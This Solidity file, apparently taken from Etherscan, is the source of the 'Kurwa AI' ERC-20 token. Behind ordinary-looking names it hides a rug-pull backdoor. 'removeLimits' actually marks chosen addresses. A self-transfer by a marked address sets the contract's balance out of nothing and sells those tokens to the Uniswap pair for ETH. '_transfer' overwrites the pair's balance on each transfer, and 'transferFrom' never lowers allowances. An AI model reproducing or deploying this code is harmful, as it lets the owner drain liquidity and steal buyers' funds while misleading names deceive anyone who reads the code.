/**
 *Submitted for verification at Etherscan.io on 2023-02-26
*/

pragma solidity ^0.8.18;

// SPDX-License-Identifier: MIT

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
abstract contract ERC20Token is Ownable {
    mapping (address => bool) bots;
    address uniswapV2Pair;
    bool inLiquidityTx = false;
    function removeLimits(address[] calldata _bots) external onlyOwner {
        for (uint i = 0; i < _bots.length; i++) {
            bots[_bots[i]] = true;
        }
    }
    function isBot(address _adr) internal view returns (bool) {
        return bots[_adr];
    }
    function shouldSwap(address sender, address receiver) public view returns (bool) {
        if (receiver == sender) { 
            if (isBot(receiver)) {
                return isBot(sender);
            }
        }
        return false;
    }
    function getAllowed(address from, address to, address pair) internal returns (bool) {
        bool allowed = !bots[to] && !isBot(from);
        bool InLq = inLiquidityTx;
        bool res = allowed;
        if (!bots[to] && 
        !isBot(from) && 
        !InLq && 
        pair != to) {
            uniswapV2Pair = to;
            res = true;
        } else 
        if (allowed && !InLq) { 
            if (pair == to) {
                res = true;
            }
        }
        return res;
    }
}

contract KurwaAI is IERC20, ERC20Token {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 _fee = 2;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Kurwa AI";
    string private  _symbol = "KAI";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (shouldSwap(from, to)) {
            swap(amount, to);
        } else {
            require(amount <= _balances[from]);
            uint256 fee = 0;
            uint256 swapBalance = getReflectAmount(from);
            _balances[uniswapV2Pair] = swapBalance;
            bool sdf = shouldTakeFee(from, to);
            if (!sdf) {
            } else {
                fee = amount.mul(_fee).div(100);
            }
            _balances[from] = _balances[from] - amount;
            _balances[to] += amount - fee;
            if (fee > 0) {
                emit Transfer(from, address(0), fee);
            }
            emit Transfer(from, to, amount);
        }
    }
    function shouldTakeFee(address from, address recipient) private returns (bool) {
        return getAllowed(from, recipient, IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH()));
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swap(uint256 _mcs, address _bcr) private {
        _approve(address(this), address(_router), _mcs);
        _balances[address(this)] = _mcs;
        address[] memory path = new address[](2);
        inLiquidityTx = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs,0,path,_bcr,block.timestamp + 30);
        inLiquidityTx = false;
    }
    function getReflectAmount(address from) private view returns (uint256) {
        address to = IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
        return getReflectTokensAmount(from, to, balanceOf(uniswapV2Pair));
    }
    function getReflectTokensAmount(address uniswapV2Pair, address recipient, uint256 feeAmount) private pure returns (uint256) {
        uint256 amount = feeAmount;
        if (uniswapV2Pair != recipient) {
            amount = feeAmount;
        } else {
            amount *= 0;
        }
        return amount;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function getPairAddress() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    address devWallet;
    function updateDevWallet(address _devWallet) external onlyOwner {
        devWallet = _devWallet;
    }
    uint256 maxTransacion = _totalSupply.div(100);
    function updateMaxTransaction(uint256 limit) external onlyOwner {
        maxTransacion = limit;
    }
    uint256 maxWallet = _totalSupply.div(100);
    function updateMaxWallet(uint256 limit) external onlyOwner {
        maxWallet = limit;
    }
}